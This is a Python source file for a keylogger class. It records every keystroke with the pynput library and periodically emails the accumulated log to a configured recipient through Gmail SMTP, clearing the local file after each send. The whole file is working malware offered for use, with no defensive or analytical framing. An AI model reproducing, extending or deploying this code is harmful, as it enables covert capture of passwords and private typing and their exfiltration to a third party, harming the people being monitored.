from pynput.keyboard import Key, Listener
from threading import Thread
import smtplib, ssl
import logging
import time
import os


class keylogger():
    def __init__(self, log_file_name, sender_mail, sender_password, receiver_mail, mail_subject, wait_time_to_send, file_size_to_send):
        self.log_file_name = log_file_name

        self.sender_mail = sender_mail 
        self.sender_password = sender_password
        self.receiver_mail = receiver_mail
        self.mail_subject = mail_subject

        self.wait_time_to_send = wait_time_to_send
        self.file_size_to_send = file_size_to_send

        # set logging
        logging.basicConfig(filename=self.log_file_name, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        # set threads
        self.listener_thread = Thread(target=self.__listener)
        self.send_by_time_thread = Thread(target=self.__send_by_time)
        


    def __listener(self):
        """starts listener uses __on_press method"""
        print("listener started")
        with Listener(on_press=self.__on_press) as listener:
            listener.join() 
        
    def __on_press(self, key):
        """logs keys on press and checks if provided file limit reached if this is the case sends mail and clears file"""
        logging.info(str(key))
        if(os.path.getsize(self.log_file_name) > self.file_size_to_send):
            file_content = self.__read_and_clear_file()
            self.__send_mail(file_content)

    def __send_by_time(self):
        """sends mail and clears file with provided time period"""
        while True:
            time.sleep(self.wait_time_to_send)
            file_content = self.__read_and_clear_file()
            self.__send_mail(file_content)

    def __send_mail(self, mail_body):
        """sends keylogs as mail"""
        try:
            message = "Subject: {}\n\n{}".format(self.mail_subject, mail_body).encode("utf-8")
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
                server.login(self.sender_mail, self.sender_password)
                server.sendmail(self.sender_mail, self.receiver_mail, message)
            print("The mail has been sent")
        except Exception as e:
            print(e)

    def __read_and_clear_file(self):
        """returns and clears file content"""
        with open(self.log_file_name, "r+") as file:
            file_content = file.read()
            file.truncate(0)
        return file_content



    def start(self):
        """starts keylogger if wait_time_to_send is provided while instantiating also starts a thread for that"""
        self.listener_thread.start()
        if(self.wait_time_to_send):
            self.send_by_time_thread.start()
        
